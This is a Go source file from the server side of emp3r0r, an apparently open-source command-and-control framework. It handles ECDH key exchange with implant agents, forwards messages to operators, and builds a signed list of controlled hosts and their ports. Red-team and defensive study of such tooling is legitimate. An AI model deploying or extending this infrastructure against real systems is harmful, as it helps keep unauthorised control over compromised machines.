package server

import (
	"fmt"
	"strings"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/sanitize"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// processKeyExchange handles the ECDH key exchange and session key derivation.
func processKeyExchange(msg *def.MsgTunData, pfsEstablished bool) (replyData, sessionKey []byte, err error) {
	if len(msg.EphemPublicKey) > 0 {
		// 1. Generate Server Ephemeral Key Pair
		serverPrivKey, err := transport.GenerateEphemeralKeyPair()
		if err != nil {
			logging.Errorf("Handshake error: failed to generate ephemeral key: %v", err)
			return nil, nil, err
		}

		// 2. Parse Agent's Public Key
		agentPubKey, err := transport.DeserializePublicKey(msg.EphemPublicKey)
		if err != nil {
			logging.Errorf("Handshake error: failed to deserialize agent public key: %v", err)
			return nil, nil, err
		}

		// 3. Derive Shared Secret
		sharedSecret, err := transport.PerformECDH(serverPrivKey, agentPubKey)
		if err != nil {
			logging.Errorf("Handshake error: failed to perform ECDH: %v", err)
			return nil, nil, err
		}

		// 4. Derive Session Key
		sessionKey, err = transport.DeriveSessionKey(sharedSecret, msg.AgentUUID)
		if err != nil {
			logging.Errorf("Handshake error: failed to derive session key: %v", err)
			return nil, nil, err
		}

		// 5. Prepare Response (Server Public Key)
		replyData = transport.SerializePublicKey(&serverPrivKey.PublicKey)
		logging.Infof("Key Exchange: Deriving session key for %s (PFS)", msg.Tag)
	} else {
		// No public key provided
		if pfsEstablished {
			// Already established PFS, just a keep-alive
			replyData = util.RandBytes(util.RandInt(10, 100))
			logging.Debugf("Keep-alive from %s (PFS active)", msg.Tag)
		} else {
			return nil, nil, fmt.Errorf("agent %s did not provide ephemeral key for initial handshake", msg.Tag)
		}
	}
	return replyData, sessionKey, nil
}

// operatorBroadcastPrintf broadcasts a message to all connected operators.
func operatorBroadcastPrintf(msg_type, format string, a ...any) (err error) {
	msg := sanitize.SanitizeText(fmt.Sprintf(format, a...))
	msgTunData := def.MsgTunData{
		Tag:      msg_type,    // tell operator about the message type: INFO, WARN, ERROR, SUCCESS
		Response: []byte(msg), // message content
		JobID:    "",
		CmdSlice: []string{},
	}
	return fwdMsg2Operators(msgTunData)
}

// fwdMsg2Operators forwards a message to all connected operator sessions.
func fwdMsg2Operators(msg def.MsgTunData) (err error) {
	OPERATORS.Range(func(id, value any) bool {
		op, ok := value.(*operator_t)
		if !ok || op == nil || op.conn == nil {
			return true // continue iteration
		}
		op.mu.Lock()
		defer op.mu.Unlock()
		encoder := cbor.NewEncoder(op.conn)
		err = encoder.Encode(msg)
		if err != nil {
			logging.Errorf("Failed to forward message to operator: %v", err)
			return false // stop iteration on error
		}
		return true // continue iteration
	})
	return err
}

// fwdMsgToOperator forwards a message to one operator session.
func fwdMsgToOperator(operatorSession string, msg def.MsgTunData) error {
	if operatorSession == "" {
		return fmt.Errorf("empty operator session")
	}
	val, ok := OPERATORS.Load(operatorSession)
	if !ok {
		return fmt.Errorf("operator session %q not connected", operatorSession)
	}
	op, ok := val.(*operator_t)
	if !ok || op == nil || op.conn == nil {
		return fmt.Errorf("operator session %q has no active tunnel", operatorSession)
	}
	op.mu.Lock()
	defer op.mu.Unlock()
	// Never let a stuck operator block the caller indefinitely. The caller
	// (message tunnel) forwards in a goroutine; a timeout bounds the goroutine.
	_ = op.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	encoder := cbor.NewEncoder(op.conn)
	if err := encoder.Encode(msg); err != nil {
		return fmt.Errorf("forward to operator %q: %w", operatorSession, err)
	}
	return nil
}

// collectEnrichedPeerList gathers active agent peer info and signs it with the CA key.
func collectEnrichedPeerList() (*def.EnrichedPeerList, []string, error) {
	peers := make([]def.EnrichedPeer, 0)
	simpleIPsMap := make(map[string]bool)

	live.AgentControlMap.Range(func(key, value any) bool {
		agent, ok := key.(*def.Emp3r0rAgent)
		if !ok || agent == nil {
			return true
		}

		fromIP := strings.Split(agent.From, ":")[0]
		if fromIP != "" && fromIP != "127.0.0.1" {
			simpleIPsMap[fromIP] = true
		}
		var lastSeen time.Time
		if seenAt, ok := agents.AgentLastSeen(agent.UUID); ok {
			lastSeen = seenAt
		}
		for _, ip := range agent.IPs {
			if ip != "" && ip != "127.0.0.1" && !strings.HasPrefix(ip, "127.") {
				simpleIPsMap[ip] = true
			}
		}

		gossipPort := agent.MeshGossipPort
		if gossipPort == "" {
			gossipPort = "7946"
		}
		if fromIP != "" && fromIP != "127.0.0.1" {
			simpleIPsMap[fmt.Sprintf("%s:%s", fromIP, gossipPort)] = true
		}

		p := def.EnrichedPeer{
			UUID:           agent.UUID,
			IPs:            agent.IPs,
			From:           agent.From,
			P2PRelayPort:   agent.P2PRelayPort,
			MeshGossipPort: agent.MeshGossipPort,
			Files:          agent.Files,
			LastSeen:       lastSeen.Unix(),
		}
		peers = append(peers, p)
		return true
	})

	simpleIPList := make([]string, 0, len(simpleIPsMap))
	for ip := range simpleIPsMap {
		simpleIPList = append(simpleIPList, ip)
	}

	if len(peers) == 0 {
		return nil, simpleIPList, nil
	}

	cborBytes, err := cbor.Marshal(peers)
	if err != nil {
		return nil, simpleIPList, fmt.Errorf("marshal enriched peers: %w", err)
	}

	sig, err := transport.SignWithCAKey(cborBytes)
	if err != nil {
		return nil, simpleIPList, fmt.Errorf("sign enriched peers: %w", err)
	}

	return &def.EnrichedPeerList{
		Peers:     peers,
		Signature: sig,
	}, simpleIPList, nil
}
